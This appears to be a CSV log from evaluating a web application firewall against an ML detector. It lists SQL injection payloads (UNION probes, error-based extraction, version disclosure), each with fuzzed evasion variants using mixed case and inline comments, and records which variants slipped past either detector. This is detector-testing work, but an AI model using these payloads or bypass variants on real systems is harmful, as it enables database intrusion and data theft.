Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
27,2024-12-16T22:20:47.466047,27915,200,200,403,waf_correct_ml_incorrect,0x6d0b,2024-12-16T22:20:47.826733,200,200,both_correct,0x6d0b,2024-12-16T22:20:49.212516,200,200,both_correct,0x6d0b,2024-12-16T22:20:50.632851,200,200,both_correct,0x6d0b,2024-12-16T22:20:52.065628,200,200,both_correct,0x6d0b,2024-12-16T22:20:53.494944,200,200,both_correct
28,2024-12-16T22:20:54.907592,"oso, el",200,200,200,both_correct,"oso,	el",2024-12-16T22:20:55.378341,200,200,both_correct,"oso, el",2024-12-16T22:20:56.813732,200,200,both_correct,"oso,	el",2024-12-16T22:20:58.296863,200,200,both_correct,"oso,
el",2024-12-16T22:20:59.757590,200,200,both_correct,"oso,	el",2024-12-16T22:21:01.232120,200,200,both_correct
29,2024-12-16T22:21:02.698072,"-4869%' union all select 5729,5729,5729--",403,403,403,both_correct,"-4869%' union all SElEct  AND/**/(SELECT
1),5729,'5' LIKE '5'--",2024-12-16T22:21:04.714181,403,403,both_correct,"-4869%'/**/union all SElEct  AND/**/(SELECT
1),(SELECT 5729),'5' LIKE	' OR 0 like 16'--",2024-12-16T22:21:08.757124,403,403,both_correct,"-4869%'/*5f*/union all SElEct  AND (SELECT	2074 IN (2073,2074,2075)),(SELECT 5729),'5' LIKE	' || (sELeCT 1) lIKe 0x10'--",2024-12-16T22:21:14.216857,403,403,both_correct,"-'rbl_' LikE 'rbl_'%'/**/union all SElEct  AND (SELECT	2074 IN (2073,2074,2075)),(SELECT/**/5729),' AND 1' LIKE '  oR  (sELect 0x1) lIkE 0x10'--",2024-12-16T22:21:21.159276,403,403,both_correct,"-'rbl_' lIkE 'rbl_'%' union all SElEct  AND (SELECT	(SELECT 1) IN (0x819,2074,2253=2253)),(SELECT/**/5729),' && 1' LIKE '  or  (SeLeCT	0x1) lIkE 0x10'--",2024-12-16T22:21:29.033901,403,403,both_correct
30,2024-12-16T22:21:37.255640,"1' where 1602  =  1602 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",403,403,403,both_correct,"1' wheRe 1602  =  1602 or   (  sElECT 2*  (  If   (    (   selECt * fRoM   (  SELect concat  (  0x7171706a71,  (  sElEct   (  elt  (
 8113  =   AND 1,(SELECT 1)   )    )     )  ,0x717a767a71,0x78  /**/)    )   s  )  , 'e5'<>'e53', 8446744073709551610   )    )     )  --",2024-12-16T22:21:49.781568,403,403,both_correct,"(selEct 1)' wheRe 1602  =  1602 or   (  sElECT 0x2*  (  If   (    (   selECt * fRoM   (  SELect concat  (  0x7171706a71, 	(  sElEct   (  elt  (
 8113  =   AND/**/'!' LIKE '!',(SELECT 1)   )    )     )  ,0x717a767a71,0x78  /**/)    )   s  )  , 'e5'<>'e53', 8446744073709551610   )    )     )  --",2024-12-16T22:22:03.474753,403,403,both_correct,"(SELECt 1)' wheRe 6438 IN (6437,6438,6439)  =  1602 or   (  sElECT 0x2*  (  If   (    (   selECt * fRoM   (  SELect concat  (  0x7171706a71, 
(  sElEct   (  elt  (
 (SELECT 8113)  =   AND '!' LIKE '!',(SELECT  AND 1)   )    )     )  ,0x717a767a71,0x78  /**/)    )   s  )  , 'e5'<>'e53', 8446744073709551610   )    )     )  --",2024-12-16T22:22:18.532608,403,403,both_correct,"(SELeCT 1)' wheRe 6438 IN (6437,0x1926,6439)  =   AND 1 or   (  sElECT 0x2*  (  If   (    (   selECt * fRoM   (  SELect concat  (  0x7171706a71, 
(  sElEct   (  elt  (
 (SELECT 8113)  =   AND '!' LIKE '!',(SELECT  AND 1)   )    )     )  ,0x717a767a71,0x78  /**/)    )  /**/s  )  , 'e5'<>'e53', 'Y$'!='Y$n'
  )    )     )  --",2024-12-16T22:22:35.126558,403,403,both_correct,"(sELecT 1)' wheRe 6438 IN (6437,0x1926, AND 1)  =   AND 'Jw'<>'Jw$' or   (  sElECT 0x2*  (  If   (    (   selECt * fRoM   (  SELect concat  (  0x7171706a71, 
(  sElEct   (  elt  (	 (SELECT 8113)  =   AND '!' LIKE '!',(SELECT  AND 0x1)   )    )     )  ,0x717a767a71,0x78  /**/)    )  /**/s  )  , 'e5'<>'e53', 'Y$'!='Y$n'
  )    )    /* .NZ*/)  --",2024-12-16T22:22:51.287656,403,403,both_correct
31,2024-12-16T22:23:08.963051," select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",403,403,403,both_correct," sElecT * fRoM
users WHERe id  =  '(SELECT 1)' oR !<'1K,' LIKE '1K,' union/**/SelecT 1,version  (    )   -- 0x1'",2024-12-16T22:23:12.926397,403,403,both_correct," SElEct * FrOM
users wHERE id  =  '(SELECT 0x1)'
oR !<'1K,'/**/likE '1K,' union/**/selECt  or 4782 like 4782,version  (    )   -- 0x1';",2024-12-16T22:23:19.351888,403,200,waf_correct_ml_incorrect," selEcT * FROM
users WHERE id   LikE   '(SELECT 0x1)'
Or !<'1K,'/**/lIKE '1K,' union SeleCt  or 4782 lIKe (SeLEcT 4441 iN (4440,(SELECT 1),4442)),version  (   	)   -- 0x1';?",2024-12-16T22:23:26.785666,403,403,both_correct," sElect * fROM
users WHerE id   LiKe   '(SELECT 0x1)'
oR !<'1K,' liKe '1K,' union SEleCT  or 9839 LIKE 9839 Like (SEleCT 4441 iN ( OR 0,(SElEcT 1),0x115a)),version  (   
)   -- 0x1';?"" ",2024-12-16T22:23:35.992228,403,403,both_correct," SELECt * FrOm
users/**/whERe	id   LikE   '(SELECT 0x1)'
|| !<'1K,' LIke '1K,' union sElect  Or  aND (SELECT 1) like 9839 LIke (sElect 4441 In ( oR 0,(selEct '<-l'!='<-lC'),0x115a)),version  (   
)   -- 0x1';?"" ",2024-12-16T22:23:46.000059,403,403,both_correct
32,2024-12-16T22:23:56.956912,"1'||  (  select 'wgte' from dual where 6316  =  6316 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",403,403,403,both_correct,"1'||  (  select 'wgte' from dual where 6316  =  2234=2234 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (	 3484/**/ =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 0x7538dcfb7617fffa, (SELECT 1)   )    )      )    )   ||'",2024-12-16T22:24:11.442892,403,403,both_correct," And 1'||  (  select 'wgte' from dual where 6316  =  2234='3c'<>'3c|' and   (  select 0x2*  (  if   (    (   select */**/from   (  select concat  (  0x7171706a71,  (  select   (  elt  (
 3484/*G*/ =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 0x7538dcfb7617fffa, (SELECT 1)   )    )      )    )   ||'",2024-12-16T22:24:26.412011,403,403,both_correct," AND (SelECt 1)'||  (  select 'wgte' from dual where 6316  =  2234='3c'<>'3c|' and   (  select 0x2*  (  if   (    (   select */*5=`=*/from   (  select concat  (  0x7171706a71,  (  select   (  elt  ( /**/3484/**/ =  3484, AND 1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 0x7538dcfb7617fffa, (SELECT 7042 IN (7041,7042,7043))   )    )      )    )   ||'",2024-12-16T22:24:42.496720,403,403,both_correct," && (seLEcT 0x1)'||  (  select 'wgte' from dual
where 6316  =  2234='3c'<>'3c|' and   (  select 0x2*  (  if   (    (   select */*5=`=*/from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484/*k`uXw*/ =  3484, AND 1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 0x7538dcfb7617fffa, (SELECT 7042 IN (7041,7042, OR '1'!='1?'))   )    )      )    )   ||'",2024-12-16T22:25:00.705438,403,200,waf_correct_ml_incorrect,"  AnD  (seleCt 0x1)'||  (  select 'wgte' from dual
where 6316  =   OR 0='3c'<>'3c|' and   (  select 0x2*  (  if   (    (   select */**/from   (  select concat  (  0x7171706a71,  (  select   (  elt  (	 3484/*k`uXw*/ =  3484, AND 1   )    )/**/    )  ,0x717a767a71,0x78   )    )   s  )  , 0x7538dcfb7617fffa, (SELECT 5291 NOT LIKE 5292 IN (7041,7042, OR '1'!='(SELECT 1)?'))   )    )      )    )   ||'",2024-12-16T22:25:19.176550,403,403,both_correct
33,2024-12-16T22:25:39.039556,7ons15804d04en2e,200,200,200,both_correct,7ons15804d04en2e,2024-12-16T22:25:39.914563,200,200,both_correct,7ons15804d04en2e,2024-12-16T22:25:41.775733,200,200,both_correct,7ons15804d04en2e,2024-12-16T22:25:43.687279,200,200,both_correct,7ons15804d04en2e,2024-12-16T22:25:45.606352,200,200,both_correct,7ons15804d04en2e,2024-12-16T22:25:47.489983,200,200,both_correct
34,2024-12-16T22:25:49.341005,1'+  (  select naiw where 4924  =  4924,403,403,403,both_correct,0x1'+  (  select/**/naiw where  OR 0  = 	'vet'<>'vetI',2024-12-16T22:25:51.513300,403,200,waf_correct_ml_incorrect,"0x1'+  (  select naiw where  OR  OR (SELECT ']' NOT LIKE ']b')  = 
'vet'<>'vetI'",2024-12-16T22:25:55.186132,403,403,both_correct,"0x1'+  (  select naiw where  OR  OR (SELECT ']'/*_-*/NOT LIKE
']b')  = 
'vet'<>'vetI'",2024-12-16T22:26:00.113878,403,403,both_correct,"0x1'+  (  select naiw where/**/ OR  OR (SELECT ']'/**/NOT LIKE
']b')  =  'vet'<>'vetI'",2024-12-16T22:26:05.256311,403,403,both_correct,"0x1'+  (  select naiw where/**/	OR  OR (SELECT ']'/**/NOT LIKE
']b')  =/*W,`a*/ 'vet'<>'vetI'",2024-12-16T22:26:10.392059,403,403,both_correct
35,2024-12-16T22:26:15.782557,9191,200,200,200,both_correct,"
or 0x0",2024-12-16T22:26:16.108149,200,403,waf_correct_ml_incorrect,"
Or
0x0",2024-12-16T22:26:17.504634,200,200,both_correct," Or
0x0",2024-12-16T22:26:18.913998,200,200,both_correct,"	||
0x0",2024-12-16T22:26:20.357874,200,403,waf_correct_ml_incorrect,"
 OR 
0x0",2024-12-16T22:26:21.773296,200,403,waf_correct_ml_incorrect
36,2024-12-16T22:26:23.245192,"-1475""  )   union all select 8611,8611,8611#",403,403,403,both_correct,"-0x5c3""/**/ )
  union all SELEcT 3679 lIkE 3679,8611, OR 0#*.",2024-12-16T22:26:25.697875,403,403,both_correct,"-0x5c3""/*A#*/ )	  union/**/all SeLEcT (SElECT (SElect 1))<>5445 LIkE 3679,8611, || 0#*.",2024-12-16T22:26:29.721437,403,200,waf_correct_ml_incorrect,"-0x5c3""/*A#*//**/)
  union/*-*/all SEleCT (SELEcT (seLeCt 2114<>2115)) NOT LIKE 5445 LiKe 3679,(SELECT 8611), || (seLEcT 1)#*.",2024-12-16T22:26:34.830883,403,403,both_correct,"-0x5c3""/*A#*//**/)	  union/*-*/all sELeCt (selECT (seLECt 2114 not like 2115))/**/NOT LIKE (SELECT 5445) liKE 3679,(SElect 8611), || (select ' AND 1('!='7(a')#*.$",2024-12-16T22:26:41.766541,403,403,both_correct,"-0x5c3""/*A#*//*;T.*/)
  union/*-*/all seleCT (sELecT (sELEcT 2114 not like 2115))/**/NOT LIKE (seLECT  OR 0) liKE '>M:'!='>M:z',(SElEcT 8611), || (seLEcT/**/' AND 1(' NOT LIKE '(SELECT 7)(a')#*.$",2024-12-16T22:26:50.354211,403,403,both_correct
37,2024-12-16T22:27:01.017630,3.1201E+15,200,200,200,both_correct,(SELECT/**/ AND 1).1201E+'%ay' like	'%ay',2024-12-16T22:27:01.636842,403,403,both_incorrect,"(SeLECt  AnD 0x1).1201E+'%ay' LIkE
'%ay'",2024-12-16T22:27:04.665759,403,403,both_incorrect,(SElECt/*Deah*/ aND 0x1).1201E+'%ay' LIke	'%ay',2024-12-16T22:27:07.668536,403,200,waf_incorrect_ml_correct,(SelEct  && 0x1).1201E+'%ay' LiKe '%ay',2024-12-16T22:27:11.008125,403,200,waf_incorrect_ml_correct,"(seLEct/**/  aND 
0x1).1201E+'%ay' LiKE '%ay'",2024-12-16T22:27:13.914485,403,200,waf_incorrect_ml_correct
38,2024-12-16T22:27:17.144281,1'||  (  select 'tisi' from dual where 1616  =  1616 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ||',403,403,200,waf_correct_ml_incorrect,1'||  (  select 'tisi' from dual where 1616  =   AND 1 and 2853  =  cast   (    (   chr  (  113  ) 	||chr  (  2071 NOT LIKE 2072  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )/*1*/  ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  (SELECT 113)  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ||',2024-12-16T22:27:35.716304,403,200,waf_correct_ml_incorrect,1'||  (  select 'tisi' from dual where 1616  =   AND 1 and 2853  =  cast   (    (   chr  (  113  ) 	||chr  (   OR 0 NOT LIKE 2072  )  ||chr  ( 	112  )  ||chr  (  106  )  ||chr  (  113   )    )/**/  ||/**/ (  select   (  case when   (  2853  =  0xb25  )   then 1 else 0 end   )    )   ::text||  (  chr  (  (SELECT 113)  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ||',2024-12-16T22:27:56.764744,403,200,waf_correct_ml_incorrect,"1'||  (  select 'tisi' from dual where 1616  =   AND 1 and (SELECT 2853)  =  cast   (    (   chr  (  113  ) 	||chr  (   OR 0 NOT LIKE (SELECT 1)  )  ||chr  ( 
112  )  ||chr  (  106  )  ||chr  (  825=825   )    )/**/  ||/**/ (  select   (  case when   (  2853  =  0xb25  )   then 1 else 0 end   )    )   ::text||  (  chr  (  (SELECT 113)  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )/**/   as numeric   )    )   ||'",2024-12-16T22:28:17.842478,403,200,waf_correct_ml_incorrect,"1'||  (  select 'tisi' from dual where 1616  =   AND 1 and (SELECT 'bBj'!='bBjG')  =  cast   (    (   chr  (  113  ) 	||chr  (   OR 0 NOT LIKE (SELECT (SELECT 1))  )  ||chr  ( 
112  )  ||chr  (  106  )  ||chr  (  825=825   )    )/**/  ||/**/ (	 select   (  case when   (  2853  =  0xb25  )   then 1 else 0 end   )    )   ::text||  (  chr  (  (SELECT 113)  )  ||chr  (  122  )  ||chr  (   OR 0  )  ||chr  (  122  )  ||chr  (  113   )    )/**/   as numeric   )    )  /*VgQ.N*/||'",2024-12-16T22:28:39.995650,403,200,waf_correct_ml_incorrect,1'||  (  select 'tisi' from dual where 1616  =   AND 1 and (SELECT 'bBj'!='bBjG')  =  cast   (    (   chr  (  113  ) 	||chr  (   OR 0 NOT LIKE (SELECT (SELECT 1))  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  825=825   )    )   ||/**/ (	 select   (  case when   (  (SELECT 2853)  =  0xb25  )   then 1 else 0 end   )    )   ::text||  (  chr  (  (SELECT 113)  )  ||chr  (  122  )  ||chr  (   OR 4829<>4830  )  ||chr  (  (SELECT 1)  )  ||chr  (  113   )    )/**/   as numeric   )    )  /*VgQ.N*/||',2024-12-16T22:29:03.722464,403,403,both_correct
39,2024-12-16T22:29:28.386686," union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --",403,403,403,both_correct," union   (  SelECt NULL, NULL, NULL, NULL,  NULL,   (  SeLECT @@version   ) /**/	 )    --",2024-12-16T22:29:32.473858,403,403,both_correct," union   (  seLeCT NULL, NULL, NULL, NULL,  NULL,   (  SELeCt @@version  /**/) /**/
 )    --",2024-12-16T22:29:37.683997,403,403,both_correct," union   (  sELecT NULL, NULL, NULL, NULL,  NULL,   (  SELECT @@version  /**/)  
 )	   --",2024-12-16T22:29:43.093948,403,403,both_correct," union   (  SElect NULL, NULL, NULL, NULL,  NULL,   (  SEleCt @@version	  )  
 )	   --",2024-12-16T22:29:48.611307,403,403,both_correct," union   ( /**/seleCT NULL,
NULL, NULL, NULL,  NULL,   (  sELect @@version	  )  
 )	   --",2024-12-16T22:29:53.724792,200,403,waf_incorrect_ml_correct
40,2024-12-16T22:29:58.965972,"1""  )   where 9093  =  9093",403,200,200,both_incorrect,"
AND 0x1""  )/**/  wHErE 'T,O'='T,O'   lIKe   9093",2024-12-16T22:30:00.387213,403,200,waf_correct_ml_incorrect,"
AnD 0x1""  )/*(&	*/  WhErE	'T,O'='T,O'   LIKe    AND (SELECT/**/2780 like 2780)",2024-12-16T22:30:03.782790,403,403,both_correct," aND 0x1""  )/*(&	*/  WHERE	'T,O' like 'T,O'   LIke    AnD (sElecT  AND 0x1 like '7X'<>'7Xl')",2024-12-16T22:30:08.552437,403,403,both_correct,"
AnD 0x1""  )/*(&	*/  wherE	'T,O' liKE 'T,O'   like   /**/AnD (SeLECT  and 0x1 likE '7X'<>'7Xl')",2024-12-16T22:30:14.079961,403,200,waf_correct_ml_incorrect,"
and 0x1""  )/*(& */  wheRE	'T,O' lIkE 'T,O'   likE    aND (SELECt  And 0x1 likE '7X'!='7Xl')",2024-12-16T22:30:19.669272,403,200,waf_correct_ml_incorrect
41,2024-12-16T22:30:25.091430,corazones 168,200,200,200,both_correct,corazones '0x1' LikE/**/' OR	0',2024-12-16T22:30:25.856514,200,200,both_correct,corazones/**/'0x1'	LikE/*kKmCK*/' OR	'.?\j<'<>'.?\j<r'',2024-12-16T22:30:28.385348,200,200,both_correct,"corazones/**/'0x1'	lIKE/*]`*/**/*/'
OR	'.?\j<'<>'.?\j<r''",2024-12-16T22:30:32.064134,200,200,both_correct,"corazones	'0x1'	LiKe/**/**/*/'
OR	'.?\j<'<>'.?\j<r''",2024-12-16T22:30:35.946019,200,200,both_correct,"corazones	'0x1'	lIKE	**/*/'
OR	'.?\j<'<>'.?\j<r''",2024-12-16T22:30:39.542569,200,200,both_correct
42,2024-12-16T22:30:43.002235,"1""   )    )    as zgig where 5748  =  5748 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",403,403,200,waf_correct_ml_incorrect,"1""   )    )    AS zgig wHERe 5748  =  5748 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  ) 
||chr  (  112  )  ||chr  (  106  )   OR chr  (  113  )  ||  (  SelECt   (  CasE When /**/ (  6055  =  (SELECT 6055)  )   ThEN 1 Else  OR 175 IN (174,175,176) EnD  )   FROm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",2024-12-16T22:31:00.690125,403,200,waf_correct_ml_incorrect,"1""   )    )    AS zgig WherE 5748  =  930!=931 aND 6055  =/**/ ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  ) 	||chr  (  112  )  ||chr  (  106  )   OR chr  (  113  )  ||  (  seLECT   (  case When /*IoB]*/ (  6055  =  (SElect 6055)  )   theN 0x1 ElSE  OR 175 In (174,175,176) EnD  )   From dual  )  ||chr  (  113  )  ||chr  (  122  )   or chr  (  (SELECT 1)  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",2024-12-16T22:31:21.040184,403,200,waf_correct_ml_incorrect,"1""   )    )    AS zgig wherE 5748   LiKE   930!=931 aND 6055  =/**/ ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  ) 	||chr  (  112  )  ||chr  (  (SELECT 106)  ) 	 oR chr  (  113  )  ||  (  selEct   (  caSE wHen /**/ (  6055  =  (SelECt 6055)  )   THEn 0x1 elSe  OR 175 in (174,175,176) EnD  )   frOm dual  )  ||chr  (  113  )  ||chr  (  122  )   OR chr  (  (selECT 1)  )  ||chr  (  (selEct 1)!=2496  )  ||chr  (  113   )    ) /**/   )  --",2024-12-16T22:31:42.315942,403,200,waf_correct_ml_incorrect,"1""   )    )    AS zgig WHeRe 5748   lIke   930!=931 And '.NF,' LiKE '.NF,'  =  ctxsys.drithsx.sn
 (  6055,  (  chr  (  (selECt 1)  )  ||chr  (  113  ) 	||chr  (  112  )   OR chr  (  (sELeCt 106)  ) 	 oR chr  (  113  )  ||  (  SElect   (  Case WHeN /**/ (  6055  =  (seleCT 6055)  )   tHeN 0x1 eLsE  OR 175 In (174,175,176) eND  )   FrOm dual  )  ||chr  (  113  )  ||chr  (  122  )   OR chr  (  (sEleCT 1)  )  ||chr  (  (seLeCT (seLect 1))!=2496  )  ||chr  (  113   )    ) /**/   )  --",2024-12-16T22:32:04.934925,403,200,waf_correct_ml_incorrect,"1""   )    )    as zgig WhERe 5748   like   930!=931 aND '.NF,' LIKE '.NF,'  =  ctxsys.drithsx.sn
 (/**/ 6055,  (  chr  (  (sELecT 1)  )  ||chr  (  113  ) 	||chr  (  0x70  )   oR chr  (  (SeLECt 106)  ) 
 Or chr  (  113  )  ||  (  seLeCt   (  caSe WHeN /**/ (  6055  =  (seLECT  AnD 1)  )   THeN 0x1 else  or 6396 NOT LIKE 6397 iN (174,175,176) END  )   fRoM dual  )  ||chr  (  113  )  ||chr  (  122  )   Or chr  (  (SeLECt 1)  )  ||chr  (  (SeLECt (sELecT 1))!=2496  )  ||chr  (  113   )    ) /*b*/   )  --",2024-12-16T22:32:29.402116,403,200,waf_correct_ml_incorrect
43,2024-12-16T22:32:54.402518,46813,200,200,200,both_correct,	aNd/**/(SEleCT 6194<>6195),2024-12-16T22:32:54.780983,200,200,both_correct,"	and/**/(SeleCT/**/'2F)' Like
'2F)' NOT LIKE 0x1833)",2024-12-16T22:32:57.150477,200,403,waf_correct_ml_incorrect,	aNd/**/(sElEct/**/'2F)' liKE '2F)' not like/**/0x1833),2024-12-16T22:33:00.740424,200,200,both_correct,"	and (sElEct/**/'2F)' LiKE '2F)'
not like/**/0x1833)",2024-12-16T22:33:04.410100,200,200,both_correct,"
and (sELEct/**/'2F)' lIkE '2F)'
not like 0x1833)",2024-12-16T22:33:07.887640,200,200,both_correct
44,2024-12-16T22:33:11.254517,"1""   )    )    as dksq where 7161  =  7161",403,403,403,both_correct,"(sElECt/*D*/3260 LIKE 3260)""   )    )    AS dksq WHere 0x1bf9   lIke  
7161",2024-12-16T22:33:13.672806,403,403,both_correct,"(sELECt/*D*/ && 1 liKe 0xcbc)""   )    )    AS/**/dksq WhEre 0x1bf9   like  	3999 LIke 3999",2024-12-16T22:33:18.274157,403,200,waf_correct_ml_incorrect,"(SElECT/**/  anD   aNd 1 LIKe 0xcbc)""   )    )    as dksq
wheRe 0x1bf9   LIkE  	(seLECT 5689 IN (5688,5689,5690)) LiKe 3999",2024-12-16T22:33:23.590134,403,403,both_correct,"(sElecT   ANd   aNd 1 LikE 0xcbc)""   )    )    As dksq	wHEre 0x1bf9   like  	(SeleCt 5689 In ((SELECT 1),4738!=4739,5690)) lIKe 0xf9f",2024-12-16T22:33:30.391641,403,200,waf_correct_ml_incorrect,"(SeLECt   and   And 0x1 liKE 0xcbc)""/**/  )    )    As dksq
WhErE 0x1bf9   LIke  	(SElECT 5689 iN ((SeLeCt (SELECT 1)),4738 not like 4739,'GA'<>'GA=')) LiKE 0xf9f",2024-12-16T22:33:37.699915,403,200,waf_correct_ml_incorrect
45,2024-12-16T22:33:46.650454,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null--",403,403,403,both_correct,"6652<> AND (SELECT 1)%""   )
   )     )   union all/**/sEleCT null,null,null,null,null,null,null,null,null--",2024-12-16T22:33:50.662326,403,403,both_correct,"(SELECT 3554)<>3555 not like  aNd (sELEct  AND 1)%""   )    )     )   union/**/all/**/SELect null,null,null,null,null,null,null,null,null--",2024-12-16T22:33:56.770458,403,403,both_correct,"(SELecT 0xde2)<>'&' not like '&2' not like  anD (sElEct  and	 anD 1)%""   )    )     )  /**/union/**/all/*M*/SeLeCT null,null,null,null,null,null,null,null,null--",2024-12-16T22:34:04.549888,403,200,waf_correct_ml_incorrect,"(seLeCT 0xde2)!='&' not like '&0x2' not like  aND (select  anD
 AnD  Or 1670 LIKE 1670)%""   )    )     )  /**/union all/**/SeLEcT null,null,null,null,null,null,null,null,null--",2024-12-16T22:34:13.441487,403,403,both_correct,"(SeleCT 0xde2)!='&' not like '&0x2' not like  aNd (sElecT /**/ANd  aND  or (SELECT 1) Like 0x1ed8!=7897)%""   )    )     )  /**/union all/**/seLEct null,null,null,null,null,null,null,null,null--",2024-12-16T22:34:22.664948,403,403,both_correct
46,2024-12-16T22:34:33.077651,-3750'+  (  select alpu where 3911  =  3911 order by 1--,403,403,403,both_correct,"- AND 1'+  (  SEleCT alpu wHERe 3911   LIkE 
/**/(sELEcT 3911) order by 3698=3698--",2024-12-16T22:34:35.863781,403,200,waf_correct_ml_incorrect,"- aNd '6' lIke '6''+ 	(  selECT alpu Where  oR 0   LIkE 
 (seLEct 3911) order by (sElEcT 3698)=3698--",2024-12-16T22:34:40.830904,403,200,waf_correct_ml_incorrect,- AnD '6' lIke '6''+ 	(  sELEct alpu Where  Or 969 Like 969   lIke   (SElEct 0xf47) order by/**/(sElecT (SElEcT 1))=3698--,2024-12-16T22:34:46.674879,200,403,waf_incorrect_ml_correct,- aND '(SELECT (SELECT 1))'	like/**/'6''+ 	(  sEleCt alpu wheRE  Or 969 lIKe 8977<>8978   lIkE   (seleCT 0xf47) order by/*R*/(sElEcT (SeLEcT 1)) LIKE 3698--,2024-12-16T22:34:53.532214,200,403,waf_incorrect_ml_correct,"- ANd '(SELECT (SELECT 1))'	liKE/*I=9B~*/'6''+ 	(  sEleCt alpu/**/wheRE  Or '!""'<>'!""t' LIKE 8977 not like 8978   lIkE   (selECT 0xf47) order by/**/(sELecT (seLect  Or 0)) lIKE (SELEct
3698)--",2024-12-16T22:35:02.096078,403,403,both_correct
